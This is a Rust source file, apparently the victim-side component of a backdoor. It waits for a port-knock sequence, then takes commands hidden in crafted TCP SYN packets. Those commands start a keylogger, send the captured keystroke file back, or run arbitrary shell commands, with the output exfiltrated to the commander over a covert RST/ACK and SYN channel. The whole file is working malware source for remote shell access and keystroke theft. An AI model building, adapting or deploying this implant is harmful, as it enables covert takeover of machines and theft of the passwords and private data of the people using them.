use std::net::{IpAddr, Ipv4Addr};
use std::sync::mpsc::{self, Receiver, Sender};
use std::thread;
use std::time::Duration;
use std::process::Command;
use pnet::packet::tcp::TcpPacket; 
use pnet::packet::Packet;
use pnet::transport::{transport_channel, TransportChannelType::Layer3, TransportSender, TransportReceiver};
use pnet::packet::ip::IpNextHeaderProtocols;
use pnet::datalink::{self, NetworkInterface};
use std::net::TcpListener;
mod keylogger;
mod covert;
mod port_knkr;

use keylogger::Control as KeylogControl;
use crate::port_knkr::{SimpleRng, generate_seed};

const CMD_START_LOGGER:   u8 = 0x10;
const CMD_STOP_LOGGER:    u8 = 0x20;
const CMD_UNINSTALL:      u8 = 0x30;
const CMD_REQUEST_KEYLOG: u8 = 0x50;

struct Victim {
    local_ip: Ipv4Addr,
    keylog_control_tx: Option<Sender<KeylogControl>>,
    keylog_data_rx:    Option<Receiver<String>>,
}

impl Victim {
    fn new() -> Self {
        let (_, local_ip) = Self::find_active_interface().expect("No active interface");
        Self {
            local_ip,
            keylog_control_tx: None,
            keylog_data_rx: None,
        }
    }

    fn find_active_interface() -> Option<(NetworkInterface, Ipv4Addr)> {
        datalink::interfaces().into_iter().find(|iface| {
            iface.is_up() && !iface.is_loopback() && !iface.ips.is_empty()
        }).and_then(|iface| {
            iface.ips.iter().find_map(|ip| {
                if let IpAddr::V4(v4) = ip.ip() { Some((iface.clone(), v4)) } else { None }
            })
        })
    }

    fn wait_for_commander(&self) -> (Ipv4Addr, u16, u16) {
        let protocol = Layer3(IpNextHeaderProtocols::Tcp);
        let (_, mut rx) = transport_channel(4096, protocol).unwrap();
        let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);

        loop {
            let seed = generate_seed(&self.local_ip, 0);
            let mut rng = SimpleRng::new(seed);
            let k1 = rng.gen_port();
            let k2 = rng.gen_port();
            let tx_p = rng.gen_port();
            let rx_p = rng.gen_port();

            if let Ok((packet, _)) = rx_iter.next() {
                let source_ip = packet.get_source(); // Extract source IP here to avoid borrow conflict
                if let Some(tcp) = TcpPacket::new(packet.payload()) {
                    if tcp.get_destination() == k1 {
                        if let Ok((packet2, _)) = rx_iter.next() {
                            if let Some(tcp2) = TcpPacket::new(packet2.payload()) {
                                if tcp2.get_destination() == k2 {
                                    return (source_ip, tx_p, rx_p);
                                }
                            }
                        }
                    }
                }
            }
            thread::sleep(Duration::from_millis(10));
        }
    }

    pub fn run(&mut self) {
        // 1. Wait for the secret knock to get the ports
        let (commander_ip, my_port, cmd_port) = self.wait_for_commander();
        
        // 2. Hijack the port immediately after learning what it is
        // We bind to 'my_port' because that's where the Commander sends the SYN data
        let _hijacker = TcpListener::bind(format!("0.0.0.0:{}", my_port));
        
        match _hijacker {
            Ok(_) => println!("[*] Port {} hijacked. Kernel RSTs suppressed.", my_port),
            Err(e) => println!("[!] Warning: Could not hijack port {}: {}. You might need iptables.", my_port, e),
        }

        // 3. Start the Raw Socket channels
        let protocol = Layer3(IpNextHeaderProtocols::Tcp);
        let (tx, rx) = transport_channel(65535, protocol).expect("Root required");
        
        // 4. Enter the loop (hijacker stays alive because it's in this scope)
        self.main_loop(tx, rx, commander_ip, my_port, cmd_port);
    }

    fn main_loop(&mut self, mut tx: TransportSender, mut rx: TransportReceiver, commander_ip: Ipv4Addr, my_port: u16, cmd_port: u16) {
        let mut receiver_state = covert::ReceiverState::new();
        let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);

        loop {
            // Process keylog data and send back to commander
            if let Some(ref rx_chan) = self.keylog_data_rx {
                while let Ok(line) = rx_chan.try_recv() {
                    self.send_covert_response(line.as_bytes(), &mut tx, commander_ip, my_port, cmd_port);
                }
            }

            if let Ok((packet, _)) = rx_iter.next() {
                // Ignore packets not from our commander
                if packet.get_source() != commander_ip { continue; }

                if let Some(parsed) = covert::parse_syn_from_ipv4_packet(packet.packet()) {
                    if parsed.dst_port == my_port {
                        // Apply chunk and get the signature to send back
                        if let Ok((_, sig_id)) = receiver_state.apply_chunk(parsed.ip_id, parsed.seq) {
                            
                            // Craft the custom RST/ACK with the mathematical signature
                            let rst_params = covert::RstAckParams {
                                src_ip: self.local_ip,
                                dst_ip: commander_ip,
                                src_port: my_port,
                                dst_port: parsed.src_port,
                                ack_number: parsed.seq.wrapping_add(1),
                                ip_id: sig_id, // This is the signature Commander is waiting for
                            };

                            let rst_pkt = covert::build_rst_ack_packet(&rst_params);
                            let _ = tx.send_to(
                                pnet::packet::ipv4::Ipv4Packet::new(&rst_pkt).unwrap(), 
                                IpAddr::V4(commander_ip)
                            );

                            if receiver_state.complete {
                                if let Ok(cmd_str) = receiver_state.message_str() {
                                    println!("[*] Executing Command: {}", cmd_str);
                                    self.handle_command(&cmd_str, &mut tx, commander_ip, my_port, cmd_port);
                                }
                                receiver_state = covert::ReceiverState::new();
                            }
                        }
                    }
                }
            }
        }
    }

    fn handle_command(&mut self, cmd: &str, tx: &mut TransportSender, cmd_ip: Ipv4Addr, my_port: u16, cmd_port: u16) {
        let bytes = cmd.as_bytes();
        if bytes.is_empty() { return; }
        
        match bytes[0] {
            CMD_START_LOGGER => self.start_keylogger(),
            CMD_STOP_LOGGER => self.stop_keylogger(),
            CMD_REQUEST_KEYLOG => self.send_keylog_file(tx, cmd_ip, my_port, cmd_port),
            CMD_UNINSTALL => std::process::exit(0),
            _ => self.execute_shell(cmd, tx, cmd_ip, my_port, cmd_port),
        }
    }

    fn send_covert_response(&self, data: &[u8], tx: &mut TransportSender, dst_ip: Ipv4Addr, src_port: u16, dst_port: u16) {
        let mut state = covert::SenderState::new_from_bytes(data);
        let protocol = Layer3(IpNextHeaderProtocols::Tcp);
        let (_, mut rx) = transport_channel(65535, protocol).unwrap();
        let mut rx_iter = pnet::transport::ipv4_packet_iter(&mut rx);

        while state.has_next() {
            if let Some((ip_id, raw_word, masked_seq)) = state.chunk_to_send() {
                let syn_pkt = covert::build_syn_packet(self.local_ip, dst_ip, src_port, dst_port, ip_id, masked_seq);
                let _ = tx.send_to(pnet::packet::ipv4::Ipv4Packet::new(&syn_pkt).unwrap(), IpAddr::V4(dst_ip));
                
                let start = std::time::Instant::now();
                while start.elapsed() < Duration::from_millis(500) {
                    if let Ok((packet, _)) = rx_iter.next() {
                        if let Some(recv_id) = covert::parse_rst_ack_ip_id(packet.packet()) {
                            if recv_id == covert::signature_ip_id(ip_id, raw_word) {
                                state.ack();
                                break;
                            }
                        }
                    }
                }
            }
        }
    }

    fn start_keylogger(&mut self) {
        let (ctrl_tx, ctrl_rx) = mpsc::channel::<KeylogControl>();
        let (data_tx, data_rx) = mpsc::channel::<String>();
        thread::spawn(move || {
            let _ = keylogger::run_with_control(ctrl_rx, data_tx);
        });
        self.keylog_control_tx = Some(ctrl_tx);
        self.keylog_data_rx = Some(data_rx);
    }

    fn stop_keylogger(&mut self) {
        if let Some(tx) = self.keylog_control_tx.take() {
            let _ = tx.send(KeylogControl::Stop);
        }
        self.keylog_data_rx = None;
    }

    fn send_keylog_file(&self, tx: &mut TransportSender, dst_ip: Ipv4Addr, src_port: u16, dst_port: u16) {
        if let Ok(content) = std::fs::read("./data/captured_keys.txt") {
            self.send_covert_response(&content, tx, dst_ip, src_port, dst_port);
        }
    }

    fn execute_shell(&self, cmd: &str, tx: &mut TransportSender, dst_ip: Ipv4Addr, src_port: u16, dst_port: u16) {
        if let Ok(output) = Command::new("sh").arg("-c").arg(cmd).output() {
            self.send_covert_response(&output.stdout, tx, dst_ip, src_port, dst_port);
        }
    }
}

fn main() {
    let mut victim = Victim::new();
    victim.run();
}
